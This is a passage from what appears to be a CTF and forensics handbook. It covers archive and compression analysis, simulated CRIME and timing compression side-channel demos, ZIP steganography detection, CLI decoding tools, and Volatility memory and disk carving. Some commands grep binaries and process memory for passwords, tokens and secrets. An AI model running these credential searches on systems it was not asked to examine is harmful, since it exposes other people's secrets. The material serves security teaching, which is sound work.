    next_header_offset = struct.unpack('<Q', data[12:20])[0]
    next_header_size = struct.unpack('<Q', data[20:28])[0]
    next_header_crc = struct.unpack('<I', data[28:32])[0]
    
    print(f"\nHeader Information:")
    print(f"  Version: {major_version}.{minor_version}")
    print(f"  Start header CRC: 0x{start_header_crc:08x}")
    print(f"  Next header offset: {next_header_offset}")
    print(f"  Next header size: {next_header_size}")
    print(f"  Next header CRC: 0x{next_header_crc:08x}")
    
    # Try to extract using py7zr if available
    try:
        import py7zr
        
        with py7zr.SevenZipFile(filepath, 'r') as archive:
            file_list = archive.getnames()
            
            print(f"\nFiles in archive: {len(file_list)}")
            
            for name in file_list[:20]:  # Show first 20
                info = archive.list()
                print(f"  {name}")
                
                # Check for encryption
                if archive.needs_password():
                    print(f"  [!] Archive is PASSWORD PROTECTED")
                    break
    
    except ImportError:
        print("\n[*] Install py7zr for detailed analysis: pip3 install py7zr")
    except Exception as e:
        print(f"\n[!] Error: {e}")

# analyze_7z('archive.7z')
```

### Compression-based Attacks

Compression can leak information about encrypted/unknown data through compression ratios and timing.

#### CRIME/BREACH Attack (Compression Information Leakage)

These attacks exploit compression side-channels in HTTPS to extract secrets.

**CRIME attack concept:**

```python
#!/usr/bin/env python3

def demonstrate_crime_attack(secret, attacker_controlled, alphabet="abcdefghijklmnopqrstuvwxyz"):
    """
    Demonstrate CRIME attack principle
    
    When compression is applied before encryption:
    1. Attacker injects guesses into plaintext
    2. Correct guesses compress better (repeated data)
    3. Shorter ciphertext = correct guess
    
    [Inference] Real CRIME attack much more complex
    """
    print("CRIME Attack Demonstration")
    print("=" * 60)
    print(f"Secret to extract: {secret}")
    print(f"Attacker can inject: {attacker_controlled}")
    print()
    
    import zlib
    
    recovered = ""
    
    for position in range(len(secret)):
        best_char = None
        best_size = float('inf')
        
        print(f"Position {position}:")
        
        for guess_char in alphabet:
            # Construct payload: known prefix + guess + attacker padding
            guess = recovered + guess_char
            payload = f"{attacker_controlled}{guess}|||{secret}"
            
            # Compress (simulates compression before encryption)
            compressed = zlib.compress(payload.encode())
            size = len(compressed)
            
            if size < best_size:
                best_size = size
                best_char = guess_char
            
            # Show some attempts
            if guess_char in secret[position:position+3]:
                print(f"  '{guess_char}': {size} bytes", end="")
                if guess_char == secret[position]:
                    print(" <- BEST (correct!)")
                else:
                    print()
        
        recovered += best_char
        print(f"  Recovered so far: {recovered}\n")
    
    print(f"Final recovered: {recovered}")
    print(f"Success: {recovered == secret}")
    
    return recovered

# Example
demonstrate_crime_attack(
    secret="sessionid=abc123",
    attacker_controlled="Cookie: sessionid=",
    alphabet="abcdefghijklmnopqrstuvwxyz0123456789="
)
```

**BREACH mitigation detection:**

```python
#!/usr/bin/env python3

def test_compression_side_channel(oracle, secret_prefix="flag{", charset="abcdefghijklmnopqrstuvwxyz0123456789_}"):
    """
    Test if service is vulnerable to compression side-channel
    
    oracle: function that takes input and returns compressed output size
    """
    print("Testing Compression Side-Channel Vulnerability")
    print("=" * 60)
    
    # Test baseline
    baseline = oracle("A" * 100)
    
    # Test with repeated content
    repeated = oracle((secret_prefix * 10))
    
    print(f"Baseline (random): {baseline} bytes")
    print(f"Repeated pattern: {repeated} bytes")
    
    compression_ratio = baseline / repeated
    
    if compression_ratio > 1.5:
        print(f"\n[!] VULNERABLE: High compression ratio ({compression_ratio:.2f})")
        print("    Service may leak information through compression")
        return True
    else:
        print(f"\n[+] Low compression ratio ({compression_ratio:.2f})")
        print("    Less likely to be exploitable")
        return False

# Example oracle (simulated)
def example_oracle(data):
    import gzip
    return len(gzip.compress(data.encode()))

# test_compression_side_channel(example_oracle)
```

#### Compression Ratio Analysis

**Entropy-based detection:**

```python
#!/usr/bin/env python3
import math
from collections import Counter

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    if len(data) == 0:
        return 0
    
    counter = Counter(data)
    entropy = 0
    
    for count in counter.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    
    return entropy

def analyze_compression_potential(filepath):
    """
    Analyze file's compression potential before compressing
    High entropy = poor compression
    Low entropy = good compression
    """
    print("Compression Potential Analysis")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Calculate entropy
    entropy = calculate_entropy(data)
    max_entropy = 8.0  # For bytes
    
    print(f"File size: {len(data)} bytes")
    print(f"Entropy: {entropy:.4f} bits/byte")
    print(f"Max entropy: {max_entropy:.4f} bits/byte")
    print(f"Entropy ratio: {(entropy/max_entropy)*100:.1f}%")
    
    # Predict compression
    if entropy > 7.5:
        print("\n[*] HIGH ENTROPY - Poor compression expected")
        print("    File may be encrypted, compressed, or random")
    elif entropy > 6.0:
        print("\n[*] MEDIUM ENTROPY - Moderate compression possible")
    else:
        print("\n[*] LOW ENTROPY - Good compression expected")
        print("    File contains redundancy/patterns")
    
    # Test actual compression
    import gzip
    import bz2
    import lzma
    
    print(f"\nActual Compression Results:")
    
    gzip_size = len(gzip.compress(data))
    gzip_ratio = len(data) / gzip_size
    print(f"  GZIP:  {gzip_size} bytes ({gzip_ratio:.2f}:1)")
    
    bz2_size = len(bz2.compress(data))
    bz2_ratio = len(data) / bz2_size
    print(f"  BZIP2: {bz2_size} bytes ({bz2_ratio:.2f}:1)")
    
    lzma_size = len(lzma.compress(data))
    lzma_ratio = len(data) / lzma_size
    print(f"  LZMA:  {lzma_size} bytes ({lzma_ratio:.2f}:1)")
    
    return entropy, gzip_ratio

# analyze_compression_potential('testfile.txt')
```

#### Steganography in Compressed Files

**Detecting hidden data in compressed archives:**

```python
#!/usr/bin/env python3

def detect_steganography_in_zip(filepath):
    """
    Detect potential steganography in ZIP files
    
    Indicators:
    - Extra data after archive
    - Unusual compression ratios
    - Encrypted files with low entropy
    - Comments containing data
    """
    print("ZIP Steganography Detection")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    suspicious_indicators = []
    
    # Check for data after End of Central Directory
    eocd_signature = b'\x50\x4b\x05\x06'
    eocd_pos = data.rfind(eocd_signature)
    
    if eocd_pos != -1:
        # EOCD found, check if data follows
        eocd_size = 22  # Minimum EOCD size
        
        # Parse comment length
        if eocd_pos + 20 < len(data):
            comment_len = struct.unpack('<H', data[eocd_pos+20:eocd_pos+22])[0]
            expected_end = eocd_pos + eocd_size + comment_len
            
            if expected_end < len(data):
                extra_bytes = len(data) - expected_end
                print(f"[!] Extra data after archive: {extra_bytes} bytes")
                suspicious_indicators.append("Extra data appended")
                
                # Show preview of extra data
                extra_data = data[expected_end:expected_end+100]
                print(f"    Preview: {extra_data[:50]}")
    
    # Analyze with zipfile
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            for info in zf.infolist():
                # Check comment
                if info.comment:
                    print(f"\n[*] File comment found: {info.filename}")
                    print(f"    Comment: {info.comment[:100]}")
                    suspicious_indicators.append("File has comment")
                
                # Check for 0% compression (stored mode with encryption)
                if info.compress_type == 0 and (info.flag_bits & 0x01):
                    print(f"\n[!] Encrypted but uncompressed: {info.filename}")
                    suspicious_indicators.append("Encrypted without compression")
                
                # Check unusual compression ratios
                if info.file_size > 0:
                    ratio = info.compress_size / info.file_size
                    if ratio > 0.99 and info.compress_type != 0:
                        print(f"\n[!] Poor compression ratio: {info.filename}")
                        print(f"    Ratio: {ratio:.2%} (expected much lower)")
                        suspicious_indicators.append("Anomalous compression ratio")
    
    except Exception as e:
        print(f"\n[!] Error reading ZIP: {e}")
    
    # Summary
    print(f"\n{'='*60}")
    if suspicious_indicators:
        print(f"[!] SUSPICIOUS - {len(suspicious_indicators)} indicators:")
        for indicator in suspicious_indicators:
            print(f"    - {indicator}")
    else:
        print(f"[+] No obvious steganography indicators found")
    
    return len(suspicious_indicators) > 0

# detect_steganography_in_zip('suspicious.zip')
```

**Extracting appended data:**

```bash
#!/bin/bash
# Extract data appended to ZIP file

ZIPFILE="$1"

# Find End of Central Directory
EOCD_OFFSET=$(grep -abo $'\x50\x4b\x05\x06' "$ZIPFILE" | tail -1 | cut -d: -f1)

if [ -n "$EOCD_OFFSET" ]; then
    echo "EOCD found at offset: $EOCD_OFFSET"
    
    # Calculate expected end (EOCD is 22 bytes minimum)
    EXPECTED_END=$((EOCD_OFFSET + 22))
    ACTUAL_SIZE=$(stat -f%z "$ZIPFILE" 2>/dev/null || stat -c%s "$ZIPFILE")
    
    if [ $ACTUAL_SIZE -gt $EXPECTED_END ]; then
        EXTRA_BYTES=$((ACTUAL_SIZE - EXPECTED_END))
        echo "Extra data detected: $EXTRA_BYTES bytes"
        
        # Extract extra data
        dd if="$ZIPFILE" bs=1 skip=$EXPECTED_END of=extracted_data.bin
        
        echo "Extracted to: extracted_data.bin"
        file extracted_data.bin
    else
        echo "No extra data found"
    fi
fi
```

#### Timing Attacks on Compression

**Timing-based compression oracle:**

```python
#!/usr/bin/env python3
import time
import zlib

def compression_timing_attack(oracle, target_string, charset="abcdefghijklmnopqrstuvwxyz"):
    """
    Extract secret using compression timing side-channel
    
    Correct guesses compress faster (less CPU time)
    
    [Inference] Requires precise timing measurements
    [Unverified] Success depends on environment noise
    """
    print("Compression Timing Attack")
    print("=" * 60)
    
    recovered = ""
    
    for position in range(len(target_string)):
        timings = {}
        
        print(f"\nTesting position {position}:")
        
        # Measure timing for each character
        for char in charset:
            guess = recovered + char
            
            # Multiple trials for accuracy
            trials = []
            for _ in range(10):
                start = time.perf_counter()
                _ = oracle(guess)
                elapsed = time.perf_counter() - start
                trials.append(elapsed)
            
            # Use median to reduce noise
            timings[char] = sorted(trials)[len(trials)//2]
        
        # Fastest = best guess (compresses quickest)
        best_char = min(timings, key=timings.get)
        recovered += best_char
        
        # Show top 3 candidates
        sorted_times = sorted(timings.items(), key=lambda x: x[1])
        print(f"  Top candidates:")
        for char, timing in sorted_times[:3]:
            marker = " <- SELECTED" if char == best_char else ""
            print(f"    '{char}': {timing*1000:.4f} ms{marker}")
        
        print(f"  Recovered: {recovered}")
    
    return recovered

# Example oracle (simulated - compresses known string + guess)
def timing_oracle(guess):
    secret = "secretdata"
    data = (secret + guess) * 100
    _ = zlib.compress(data.encode(), level=9)
    return True

# compression_timing_attack(timing_oracle, "secret", charset="abcdefghijklmnopqrstu")
```

### CTF-Specific Techniques

**Multi-layer decompression automation:**

```python
#!/usr/bin/env python3
import os
import subprocess

def recursive_decompress(filepath, max_depth=10):
    """
    Recursively decompress nested archives
    Common CTF pattern: file.gz.bz2.xz.tar.gz...
    """
    print("Recursive Decompression")
    print("=" * 60)
    
    current_file = filepath
    depth = 0
    
    while depth < max_depth:
        print(f"\nDepth {depth}: {os.path.basename(current_file)}")
        
        # Detect file type
        result = subprocess.run(['file', '-b', current_file], 
                              capture_output=True, text=True)
        file_type = result.stdout.strip().lower()
        
        print(f"  Type: {file_type}")
        
        # Determine decompression method
        if 'gzip' in file_type:
            output = current_file.rsplit('.gz', 1)[0] if current_file.endswith('.gz') else current_file + '.out'
            subprocess.run(['gunzip', '-c', current_file], stdout=open(output, 'wb'))
            current_file = output
        
        elif 'bzip2' in file_type:
            output = current_file.rsplit('.bz2', 1)[0] if current_file.endswith('.bz2') else current_file + '.out'
            subprocess.run(['bunzip2', '-c', current_file], stdout=open(output, 'wb'))
            current_file = output
        
        elif 'xz' in file_type or 'lzma' in file_type:
            output = current_file.rsplit('.xz', 1)[0] if current_file.endswith('.xz') else current_file + '.out'
            subprocess.run(['unxz', '-c', current_file], stdout=open(output, 'wb'))
            current_file = output
        
        elif 'zip' in file_type:
            output_dir = current_file + '_extracted'
            os.makedirs(output_dir, exist_ok=True)
            subprocess.run(['unzip', '-q', current_file, '-d', output_dir])
            # Find extracted file
            files = os.listdir(output_dir)
            if files:
                current_file = os.path.join(output_dir, files[0])
            else:
                print("  [!] No files extracted")
                break
        
        elif 'rar' in file_type:
            output_dir = current_file + '_extracted'
            os.makedirs(output_dir, exist_ok=True)
            subprocess.run(['unrar', 'x', '-inul', current_file, output_dir])
            files = os.listdir(output_dir)
            if files:
                current_file = os.path.join(output_dir, files[0])
            else:
                break
        
        else:
            print(f"  [+] Final file reached (no compression detected)")
            break
        
        depth += 1
    
    print(f"\nFinal file: {current_file}")
    
    # Check if it's readable text or binary
    try:
        with open(current_file, 'r') as f:
            content = f.read(500)
            print(f"\nContent preview:\n{content}")
    except:
        print("\n[*] Binary file - check manually")
    
    return current_file

# recursive_decompress('nested.gz.bz2.xz')
```

**Archive format confusion:**

```python
#!/usr/bin/env python3

def detect_real_format(filepath):
    """
    Detect real file format regardless of extension
    Common CTF trick: .zip file is actually .gz, etc.
    """
    print("Real Format Detection")
    print("=" * 60)
    
    with open(filepath, 'rb') as f:
        magic = f.read(16)
    
    formats = {
        b'\x1f\x8b': 'GZIP',
        b'BZh': 'BZIP2',
        b'\xfd7zXZ\x00': 'XZ',
        b'PK\x03\x04': 'ZIP',
        b'PK\x05\x06': 'ZIP (empty)',
        b'PK\x07\x08': 'ZIP (spanned)',
        b'Rar!\x1a\x07\x00': 'RAR 1.5-4.x',
        b'Rar!\x1a\x07\x01\x00': 'RAR 5.0+',
        b'7z\xbc\xaf\x27\x1c': '7Z',
        b'\x5d\x00\x00': 'LZMA',
    }
    
    detected = None
    for sig, fmt in formats.items():
        if magic.startswith(sig):
            detected = fmt
            break
    
    print(f"Filename: {os.path.basename(filepath)}")
    print(f"Extension: {os.path.splitext(filepath)[1]}")
    print(f"Magic bytes: {magic[:8].hex()}")
    print(f"Detected format: {detected or 'Unknown'}")
    
    # Suggest correct tool
    if detected:
        tools = {
            'GZIP': 'gunzip or gzip -d',
            'BZIP2': 'bunzip2 or bzip2 -d',
            'XZ': 'unxz or xz -d',
            'LZMA': 'unlzma or lzma -d',
            'ZIP': 'unzip',
            'RAR 1.5-4.x': 'unrar',
            'RAR 5.0+': 'unrar',
            '7Z': '7z x'
        }
        print(f"Recommended tool: {tools.get(detected, 'unknown')}")
    
    return detected

# detect_real_format('suspicious.zip')
```

### Important Related Topics

- **Zlib DEFLATE internals** (understanding compression for manipulation)
- **Archive password recovery techniques** (advanced cracking)
- **Polyglot files** (files valid as multiple formats)
- **ZIP64 format** (archives > 4GB)
- **DEFLATE bomb mitigation** (safe decompression practices)
- **Compression in network protocols** (HTTP, SSH, TLS)

---

## Tools

### CyberChef

CyberChef is a web-based utility for encoding, decoding, and analyzing data formats commonly encountered in CTF challenges. It supports 300+ operations and enables chaining multiple transformations.

##### Web Interface Usage

Access CyberChef at `https://gchq.github.io/CyberChef/` or deploy locally:

```bash
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm start
```

The interface consists of the recipe panel (left), input field (center-left), output field (center-right), and operations library (right). Drag operations from the library into the recipe to create transformation chains.

##### Common CTF Operations

Base64 decoding with automatic format detection:

Search for "Base64" in the operations panel. Drag into recipe. Paste encoded data into input. Output displays decoded content automatically. Use the "Auto Bake" toggle (top-left) to process input continuously as you edit.

Multiple encoding layers (base64 → hex → base64):

Add operations sequentially: `Base64 Decode` → `From Hex` → `Base64 Decode`. CyberChef processes data through the chain automatically.

ROT13 and Caesar cipher analysis:

Use "ROT13" for single rotation or "Caesar Cipher Brute Force" to test all 26 shifts simultaneously. The output panel displays all variants with their scores based on English language statistics.

Hash identification and cracking:

Drag "Analyse Hash" into recipe with suspected hash input. CyberChef identifies hash type (MD5, SHA1, SHA256, etc.). For weak hashes, use "Crack" operations if available, or check against known rainbow tables via integrated services.

Hexdump analysis:

Use "From Hex" to convert hexadecimal strings to readable text. Combine with "Detect Encoding" to identify character sets. For binary analysis, use "Hex Viewer" operation to display both hex and ASCII representations.

XOR operations:

Add "XOR" operation, specify key (hex or text), and apply. For unknown keys, use "XOR Brute Force" to test all single-byte keys or specify key length for multi-byte XOR attacks.

Regular expression extraction:

Use "Regular Expression" operation to find patterns matching flags (e.g., `flag\{[^}]+\}` or `CTF\{[A-Za-z0-9_]+\}`). Configure capture groups to extract specific portions.

##### Advanced Chaining

Create complex recipes for multi-stage encoding. Example: decompress gzip → decode base64 → extract strings → regex match:

1. Add "Gunzip" operation
2. Add "Base64 Decode"
3. Add "Strings" operation
4. Add "Regular Expression" with pattern `flag\{.*?\}`
5. Enable "Auto Bake"

Save recipes for reuse:

Click the bookmark icon next to "Save Recipe" (top toolbar). Name and share the recipe URL. Other users can load your saved recipe by URL, enabling collaborative CTF work.

##### Limitations and Workarounds

CyberChef operates entirely in-browser, which limits memory for processing large files (>100MB). For large datasets, use command-line tools instead. Export CyberChef output and process locally with `bash` or `python` scripts.

Some operations require specific input formats. If an operation fails silently, verify input encoding using "Detect Encoding" first.

### `base64` Command

The `base64` command encodes and decodes Base64 data at the command line. It's essential for quick encoding/decoding in CTF scenarios without GUI overhead.

##### Basic Encoding and Decoding

Encode plain text:

```bash
echo "FLAG{example}" | base64
```

Output: `RkxBR3tleGFtcGxlfQ==`

Decode Base64:

```bash
echo "RkxBR3tleGFtcGxlfQ==" | base64 -d
```

Output: `FLAG{example}`

Decode from file:

```bash
base64 -d encoded.txt > decoded.txt
```

##### Multi-Layer Decoding

Chain multiple decoding operations:

```bash
cat encoded.txt | base64 -d | base64 -d | base64 -d
```

Create a loop for iterative decoding until output stabilizes (useful for unknown encoding depth):

```bash
#!/bin/bash
input=$(cat encoded.txt)
iteration=0
while true; do
  output=$(echo "$input" | base64 -d 2>/dev/null)
  if [ "$?" -ne 0 ]; then
    echo "Final output (iteration $iteration):"
    echo "$input"
    break
  fi
  echo "Iteration $((++iteration)): $output"
  input="$output"
done
```

This script attempts repeated base64 decoding, printing each iteration. It stops when decoding fails or content doesn't change.

##### Encoding with Line Wrapping

Control output line length:

```bash
base64 -w 0 plaintext.txt
```

The `-w 0` option removes line wrapping (default is 76 characters per line). Useful for embedding encoded data in single-line contexts.

##### Binary File Encoding

Encode binary files:

```bash
base64 < archive.zip > archive.zip.b64
base64 -d < archive.zip.b64 > archive.zip
```

Verify integrity after decoding:

```bash
md5sum archive.zip archive.zip.decoded
```

Both checksums should match.

##### Detecting Base64 Obfuscation

Test if data is base64-encoded (valid base64 alphabet is `A-Z`, `a-z`, `0-9`, `+/=`):

```bash
echo "RkxBR3tleGFtcGxlfQ==" | grep -E '^[A-Za-z0-9+/]*={0,2}$'
```

If grep matches, the data is valid base64. Pipe through `base64 -d` to verify:

```bash
echo "RkxBR3tleGFtcGxlfQ==" | base64 -d && echo "Valid base64" || echo "Invalid base64"
```

### `xxd` (Hex)

The `xxd` command converts data to hexadecimal and vice versa, enabling analysis of binary files, embedded data, and obfuscated content.

##### Basic Hex Dump

Display file in hexadecimal format:

```bash
xxd binary_file
```

Output format: address, 16 bytes of hex, ASCII interpretation. Each line shows 16 bytes (customizable with `-c` option):

```bash
xxd -c 8 binary_file
```

Shows 8 bytes per line for tighter display.

##### Reverse Hex to Binary

Convert hex dump back to binary:

```bash
xxd -r hex_dump.txt > binary_file
```

The `-r` option reverses the hex dump. Useful for extracting hex-encoded payloads and reconstructing files.

##### Selective Hex Dumping

Extract specific byte ranges:

```bash
xxd -s 0x100 -l 256 binary_file
```

`-s 0x100` starts at offset 256 (hex), `-l 256` limits output to 256 bytes. Useful for examining file headers or specific structures.

For dynamic offset calculation:

```bash
offset=$((0x1000))
xxd -s $offset -l 512 binary_file
```

##### Hex String Conversion

Convert between hex strings and text:

```bash
echo -n "FLAG{test}" | xxd -p
```

Output: `464c41477b74657374207d` (no spaces, lowercase hex)

Reverse conversion:

```bash
echo "464c41477b74657374207d" | xxd -r -p
```

Output: `FLAG{test}`

The `-p` option enables "plain" mode (no address or ASCII column), producing raw hex output suitable for piping.

##### Identifying Binary Signatures

Compare file headers against known signatures:

```bash
xxd -l 32 suspected_zip.bin
```

Common signatures:

- ZIP: `50 4b 03 04` (PK..)
- PNG: `89 50 4e 47` (.PNG)
- JPEG: `ff d8 ff e0` (...)
- ELF: `7f 45 4c 46` (.ELF)
- PDF: `25 50 44 46` (%PDF)

If the header doesn't match, the file may be corrupted, encrypted, or misidentified.

##### Comparing Files

Identify differences between two files:

```bash
diff <(xxd file1) <(xxd file2)
```

Process substitution displays hex dumps side-by-side. Highlighted lines show bytes that differ.

##### Inserting Hex Patches

Create binary patches by modifying hex dumps:

```bash
xxd binary_file > hex_dump.txt
# Edit hex_dump.txt manually, changing hex values
xxd -r hex_dump.txt > patched_binary
```

Example: Change byte at offset 0x10 from `41` (A) to `42` (B):

1. Run `xxd binary_file > hex_dump.txt`
2. Find the line containing offset 0x10
3. Change `41` to `42` in that line
4. Run `xxd -r hex_dump.txt > patched_binary`

### `strings` Command

The `strings` command extracts readable ASCII and Unicode strings from binary files, revealing embedded text, credentials, flags, or code.

##### Basic String Extraction

Extract all strings longer than 4 characters (default):

```bash
strings binary_file
```

Change minimum length:

```bash
strings -n 10 binary_file
```

This outputs only strings with at least 10 characters, reducing noise.

##### Filtering Strings

Grep output for relevant patterns:

```bash
strings binary_file | grep -i flag
strings binary_file | grep -E '^[A-Za-z0-9]{32}$'
```

The first command searches case-insensitively for "flag". The second matches 32-character hex strings (common for MD5 hashes).

Search for credentials:

```bash
strings binary_file | grep -E '(password|pwd|pass|secret|key|token)='
strings binary_file | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
```

The first pattern matches common credential assignments. The second extracts email addresses.

##### Unicode String Extraction

Extract Unicode (UTF-16) strings commonly found in Windows binaries:

```bash
strings -e l binary_file
```

The `-e l` option (little-endian Unicode) extracts UTF-16LE strings. For big-endian:

```bash
strings -e b binary_file
```

Combine with grep:

```bash
strings -e l binary_file | grep -i flag
```

##### File Offset Tracking

Display byte offset of each string:

```bash
strings -t x binary_file
```

The `-t x` option shows offsets in hexadecimal. Use `-t d` for decimal or `-t o` for octal. Offsets enable targeted hex editing or payload extraction.

Example output:

```
      0x1000 FLAG{example}
      0x1010 password123
```

To extract the string at offset 0x1000 (4096 bytes):

```bash
dd if=binary_file bs=1 skip=4096 count=16
```

##### Encoded String Detection

Strings may be Base64, hex, or otherwise encoded. Process output through additional tools:

```bash
strings binary_file | base64 -d 2>/dev/null | strings
```

This extracts strings, attempts Base64 decoding on each, and re-extracts strings from the decoded output. Redirect stderr to suppress decoding errors on non-base64 strings.

For repeated encoding layers:

```bash
strings binary_file | while read line; do
  echo "$line" | base64 -d 2>/dev/null
done
```

##### Dynamic Analysis Integration

Extract strings from running processes:

```bash
strings /proc/<PID>/maps
strings /proc/<PID>/mem
```

This examines memory maps and memory contents of running processes. Combine with `grep` to search for suspicious strings or hardcoded credentials.

### `file` Command

The `file` command identifies file types by analyzing magic bytes (file signatures) and structure, essential for CTF scenarios with misidentified or disguised files.

##### Basic File Type Detection

Identify file type:

```bash
file unknown_file
```

Output example: `unknown_file: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked...`

The command reads magic bytes and compares against known signatures. This determines whether a file is executable, archive, image, etc.

##### MIME Type Output

Display MIME type suitable for web contexts:

```bash
file -i suspicious_file
```

Output example: `suspicious_file: application/x-executable; charset=binary`

Useful for determining if a web-served file has been misidentified.

##### Recursive Directory Scanning

Scan all files in a directory and subdirectories:

```bash
file -r directory/
```

Pipes output through a pager for large directories. Combine with grep:

```bash
file -r directory/ | grep -i zip
```

Finds all compressed archives in the directory tree.

##### Magic File Analysis

Specify custom magic file for extended detection:

```bash
file -m custom_magic.mgc unknown_file
```

Advanced CTF scenarios include custom file signatures. Compile a custom magic file:

```bash
file -C -m custom_magic.txt
```

The `-C` option compiles the text magic file into binary format (`.mgc`).

Example custom magic entry (detect custom CTF flag format):

```
0 string FLAG{ FLAG_file
>5 string } Custom_flag_format
```

##### Checking File Integrity

Verify file wasn't corrupted during transfer:

```bash
file original_file
file transferred_file
```

Identical output suggests identical file structure. Compare with checksums for certainty:

```bash
md5sum original_file transferred_file
```

##### Detecting Obfuscated Files

Misidentified file extensions are common CTF tricks. Check actual type:

```bash
file image.jpg
```

If output shows `Zip archive` instead of JPEG, the file is actually a compressed archive. Extract accordingly:

```bash
unzip image.jpg
```

[Inference] Some CTF challenges concatenate multiple files. Use `file` to identify boundaries:

```bash
file -b unknown_blob
```

The `-b` option displays only the file type without filename. Process large blobs by splitting and checking sections:

```bash
dd if=blob bs=1024 skip=0 count=1 | file -
dd if=blob bs=1024 skip=1 count=1 | file -
```

This incrementally checks 1KB sections to find file boundaries.

##### Extracting Embedded Files

When `file` identifies archives or embedded data within binaries, extract with appropriate tools:

```bash
file target_file  # Identifies type
strings target_file | grep -E "PK|Rar|7z"  # Searches for nested archive signatures
```

If nested, use `binwalk` for automated extraction:

```bash
binwalk -e target_file
```

Related Topics: Steganography Analysis (detecting hidden files in images), Polyglot Files (files with multiple valid formats), Archive Forensics (ZIP, RAR, 7z recovery), Malware Identification (distinguishing packers and obfuscators).

---

# PROTOCOL SECURITY



---



---



---



---



---

# SIDE-CHANNEL ATTACKS



---



---



---



---



---

# IMPLEMENTATION FLAWS



---



---



---



---

# QUANTUM CRYPTOGRAPHY & POST-QUANTUM



---



---



---

# CTF-SPECIFIC TECHNIQUES

### Forensic Extraction

#### Memory Dumps (Volatility)

Volatility is a framework for analyzing volatile memory dumps in CTF forensics scenarios. It reconstructs system state from memory snapshots to recover flags, credentials, and malicious artifacts.

##### Profile Identification

Before analyzing a memory dump, determine the correct operating system profile. Volatility requires precise profile matching for accurate reconstruction.

```bash
volatility -f memory.dump imageinfo
```

This command scans the dump and suggests matching profiles. Review the output for the "Suggested Profile(s)" field. Common profiles include `WinXPSP3x86`, `Win7SP1x64`, or `LinuxUbuntu_5_4_0-42-generic_x64`.

Alternatively, use the `kdbgscan` plugin to locate the kernel debugger block:

```bash
volatility -f memory.dump --profile=Win7SP1x64 kdbgscan
```

##### Process Analysis

Enumerate running processes at the time of the dump capture:

```bash
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 pstree
```

`pslist` displays processes in memory order; `pstree` shows parent-child relationships. Identify suspicious processes with unusual parent relationships or names mimicking legitimate system processes.

For hidden processes (rootkit detection):

```bash
volatility -f memory.dump --profile=Win7SP1x64 psxscan
```

This performs a pool tag scan to find processes that may be unlinked from the process list.

##### Memory Region Extraction

Extract process address space for offline analysis:

```bash
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <PID> -D ./dumps/
```

Replace `<PID>` with the target process ID. This writes the process's entire virtual memory to a file. Analyze the output with strings, grep, or hex editors to locate embedded flags or credentials.

##### String Extraction

Search for readable strings across memory:

```bash
volatility -f memory.dump --profile=Win7SP1x64 strings -s | grep -i flag
volatility -f memory.dump --profile=Win7SP1x64 strings -s | grep -i password
volatility -f memory.dump --profile=Win7SP1x64 strings -s | grep -i ctf
```

The `-s` option scans for strings. Pipe output to `grep` for keyword filtering. For case-insensitive searches, use `-i`.

##### Registry Analysis (Windows)

Extract registry hives from memory:

```bash
volatility -f memory.dump --profile=Win7SP1x64 hivelist
```

This locates registry hive addresses in memory. Dump specific hives:

```bash
volatility -f memory.dump --profile=Win7SP1x64 hivescan
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
```

Registry keys often contain persistence mechanisms, scheduled tasks, or user credentials relevant to CTF challenges.

##### Network Connection Analysis

Reconstruct network connections:

```bash
volatility -f memory.dump --profile=Win7SP1x64 netscan
volatility -f memory.dump --profile=Win7SP1x64 netstat
```

`netscan` uses pool tag scanning for connections; `netstat` reads kernel structures. Both reveal active TCP/UDP connections, listening ports, and associated process IDs.

##### Linux Memory Analysis

For Linux memory dumps, determine the kernel version and symbol table:

```bash
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Linux_Ubuntu_5_4_0-42-generic_x64 linux_pslist
volatility -f memory.dump --profile=Linux_Ubuntu_5_4_0-42-generic_x64 linux_netstat
volatility -f memory.dump --profile=Linux_Ubuntu_5_4_0-42-generic_x64 linux_bash
```

The `linux_bash` plugin extracts bash history from memory, often containing flags or sensitive commands.

#### Disk Analysis (Foremost, Scalpel)

These tools recover deleted files and carve data from unallocated disk space in CTF forensics scenarios.

##### Foremost Usage

Foremost scans disks for file headers and footers to recover deleted content:

```bash
foremost -i disk.img -o foremost_output/
```

This recursively scans `disk.img` and writes recovered files to `foremost_output/`. Specify file types to reduce noise:

```bash
foremost -i disk.img -t jpg,png,pdf,zip -o foremost_output/
```

Common CTF-relevant types include `zip` (archives), `pdf` (documents), `jpg/png` (images with embedded data), and `rar`. Review the `audit.txt` report in the output directory for recovery statistics.

For raw memory or fragmented disks:

```bash
foremost -i memory.dump -o memory_carving/ -T
```

The `-T` option enables verbose logging, showing which file types trigger matches.

##### Scalpel Usage

Scalpel is more configurable than foremost. Edit the configuration file to define custom signatures:

```bash
cat /etc/scalpel/scalpel.conf | grep -v "^#" | head -20
```

Run scalpel with the default configuration:

```bash
scalpel -i disk.img -o scalpel_output/
```

For custom recovery targets, modify the configuration:

```bash
nano /etc/scalpel/scalpel.conf
```

Example custom signature for CTF flags (if they follow a known pattern):

```
FLAG   ?     0      "FLAG{"   "}"
```

This searches for strings beginning with `FLAG{` and ending with `}`. After updating the config:

```bash
scalpel -c /etc/scalpel/scalpel.conf -i disk.img -o scalpel_output/
```

##### Partition Recovery

If the disk has deleted partitions, use `testdisk` or `gpart`:

```bash
testdisk disk.img
```

This opens an interactive menu for partition recovery. Navigate to "Analyse" to scan for lost partitions. Once identified, use `photorec` (bundled with testdisk) to recover files:

```bash
photorec disk.img
```

##### Slack Space Analysis

Unallocated space between files may contain flag fragments:

```bash
dd if=disk.img of=slack.bin bs=512 skip=2048 count=100
strings slack.bin | grep -i flag
```

Replace `skip` and `count` values based on your target disk sectors. Use `fdisk -l disk.img` to identify sector boundaries.

#### Network Packet Analysis (PCAP)

